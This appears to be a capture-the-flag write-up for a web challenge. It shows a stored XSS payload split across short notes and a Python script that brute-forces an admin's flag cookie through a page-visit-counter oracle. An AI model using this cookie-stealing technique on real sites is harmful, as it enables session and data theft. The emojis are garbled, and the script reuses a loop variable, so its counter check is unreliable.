üîë Step 1: Vulnerability Identification

As in the previous version of the challenge, the FLAG is set as a cookie on the admin's homepage. üç™

üîí The flag is set as a cookie, but only when an admin accesses /user/uuid-admin from localhost.

This meant that even if I had the admin's UUID, I couldn't directly access the flag from my machine. I needed to find a way to make the admin send the flag to me. ü§î

The /report/:id endpoint remained unchanged from the previous version.

However, I quickly spotted a change to the character limit per note:

  • üë§ Normal users: maximum 16 characters per note
  • üëë Admin users: maximum 56 characters per note

I quickly realized that becoming an administrator wasn't feasible, so I had to ensure that 16 characters would be sufficient for my XSS. From the previous version, I understood that this limit could be bypassed by concatenating multiple notes together (since there were no changes to note entry). üí°

Now I needed to think of a way for the admin to interact with something I could monitor. üïµÔ∏è‚Äç‚ôÇÔ∏è

Looking closely at a user's homepage, I realized that I hadn't paid attention to the page visit counter... üî¢

üéØ Key Insight: I could use that counter as admin feedback! I just needed to figure out how to exploit this vulnerability

üíª Step 2: Exploit Development

After thinking about it for a while, I concluded I could check the flag character by character. If the character I was checking matched the one I was guessing, I could have the admin redirect to a user homepage created specifically for this tracking purpose. üß©

So my plan was: starting from index 0 of the cookie containing the flag, check each printable character. When the counter increased by 1, it meant I had found the correct character in the flag. Time to write a script! üöÄ

This is the XSS payload that the admin will see when visiting my page:

<img onerror='if(document.cookie.split("; ").find(c => c.startsWith("x="))?.split("=")[1][GUESSING_INDEX]==="GUESSING_CHAR"){location="http://127.0.0.1:3000/user/TRACKING_USER_ID"}' src=x>

Where:

  • üî¢ GUESSING_INDEX: Index of the flag character
  • üî§ GUESSING_CHAR: Character I'm trying to guess
  • üè∑Ô∏è TRACKING_USER_ID: UUID of the homepage for tracking visits

And here's the Python script that automates the brute force process: üêç

import requests, string, time, urllib
from bs4 import BeautifulSoup

URL = "http://rush-hour-v2.ctf.umasscybersec.org/"
flag = ""

while not flag.endswith("}"):
    s1 = requests.Session()
    s1.get(URL)
    found_flag_user = s1.cookies.get("user")
    s = requests.Session()
    s.get(URL)
    cookie = s.cookies.get("user")
    for i, c in enumerate(string.printable):
        s.get(URL+"clear")
        TRACKING_PAGE = f"http://127.0.0.1:3000/user/{found_flag_user}"
        notes = [
            '<img onerror=\'/*',
            '*/if(document/*',
            '*/.cookie/*',
            '*/.split("; ")/*',
            '*/.find(c=>c/*',
            '*/.startsWith(/*',
            '*/"x="))/*',
            '*/?.split(/*',
            f'*/"=")[1][{len(flag)}]/*',
            f'*/==="{c}"){{/*',
            '*/location=/*'
        ]
        for i in range(0, len(TRACKING_PAGE), 9):
            notes.append("*/'" + TRACKING_PAGE[i:i+9] + "'+/*")
        notes += [
            '*/""}\' src=x>'
        ]
        assert all([len(n) <= 16 for n in notes])
        for note in notes:
            s.post(URL+"create", data={"note": note})
        s.get(URL+f"report/{cookie}")
        time.sleep(2)
        if int(BeautifulSoup(requests.get(URL+f"user/{found_flag_user}").text, features="html.parser").find(id="customers").text.split(": ")[1]) == i+3:
            flag += c
            print(f"üîç Character found: {c} | Current flag: {flag}")

    try:
        print("üö© Flag:", urllib.parse.unquote(flag))
    except:
        print("üö© Flag:", flag)

‚öôÔ∏è Logic Explanation: The script works by systematically trying each printable character. When it finds a match, the admin is redirected to our tracking page, increasing the counter. We monitor this counter to determine when we've correctly guessed a character of the flag.

The script breaks down the XSS payload into chunks of 16 characters or less, each stored as a separate note. When viewed together, these notes form our complete XSS payload. For each character we're trying to guess, the script:

  • üßπ Clears previous notes
  • üìù Creates new notes with our fragmented XSS payload
  • üîî Reports our page to the admin
  • ‚è±Ô∏è Waits to see if our counter increases
  • ‚úÖ Saves the correct character when found
